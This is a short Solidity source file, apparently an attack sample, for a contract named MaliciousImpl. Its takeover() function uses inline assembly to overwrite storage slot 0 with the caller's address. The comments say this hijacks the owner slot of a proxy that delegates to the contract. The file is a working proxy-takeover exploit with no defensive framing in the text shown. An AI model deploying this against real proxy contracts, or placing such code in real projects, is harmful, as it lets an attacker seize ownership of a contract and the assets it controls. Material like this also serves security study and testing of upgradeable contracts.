// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract MaliciousImpl {
    // note: uses same storage slot for owner as proxy
    function takeover() external {
        // slot 0 in proxy is owner - overwrite with attacker
        assembly {
            sstore(0, caller())
        }
    }
}